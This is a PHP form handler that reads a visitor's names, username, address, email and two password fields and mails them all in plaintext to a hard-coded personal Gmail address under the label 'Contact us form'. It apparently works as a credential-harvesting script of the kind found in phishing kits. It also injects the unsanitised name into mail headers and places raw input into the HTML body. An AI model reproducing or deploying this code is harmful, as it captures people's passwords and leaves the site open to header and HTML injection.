<?php
      
	//  require_once "class.phpmailer-lite.php";
	
	// $mail = new PHPMailerLite();
		
session_start();
	
if($_POST["captcha1"]==$_SESSION["captcha_code1"]){


	$fname			=	$_POST["fname"];
	$uname			=	$_POST["uname"];
	$flname			=	$_POST["flname"];
	$faddress		=	$_POST["faddress"];
	$femail			=	$_POST["femail"];
	$fPassword		=	$_POST["fPassword"];
	$vPassword		=	$_POST["vPassword"];
	
	$message         = '<table >';
	$message        .= '<tr><td>';
	$message        .= '<b>Hi,</b>';
	$message        .= '</td></tr>';

	$message        .= '<tr><td>';
	$message        .= '<b>Contact us form submitted online.</b>' ;
	$message        .= '</td></tr>';
	
	$message        .= '<tr><td>';
	$message        .= '<b>FIRST NAME 			:</b> '.$fname ;
	$message        .= '</td></tr>';
	
	$message        .= '<tr><td>';
	$message        .= '<b>USER NAME 			:</b> '.$uname ;
	$message        .= '</td></tr>';
	
	$message        .= '<tr><td>';
	$message        .= '<b>LAST NAME 			:</b> '.$flname ;
	$message        .= '</td></tr>';
		
	$message        .= '<tr><td>';
	$message        .= '<b>ADDRESS 		:</b> '.$faddress;
	$message        .= '</td></tr>';
	
	$message        .= '<tr><td>';
	$message        .= '<b>E-MAIL ID 			:</b> '.$femail ;
	$message        .= '</td></tr>';
	
	$message        .= '<tr><td>';
	$message        .= '<b>PASSWORD 		:</b> '.$fPassword ;
	$message        .= '</td></tr>';
	
	$message        .= '<tr><td>';
	$message        .= '<b>VPASSWORD 		:</b> '.$vPassword ;
	$message        .= '</td></tr>';
	
	$message        .= '</table>';
	

$headers = 'MIME-Version: 1.0' . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

// Subject
$subject = 'Online Contact form';

// To Address 
$to = "izzyshams@gmail.com";

// Additional headers
$headers	.= 'From: '.$fname.' ' . "\r\n";
//$headers	.= 'Cc: <email id here>' . "\r\n";
//$headers	.= 'Bcc: <email id here>' . "\r\n";

// Mail it
mail($to, $subject, $message, $headers);

	echo 'Thank you for your submission!';

}

else{
	
	echo 'Enter Correct Captcha Code.';	
	
}
?>
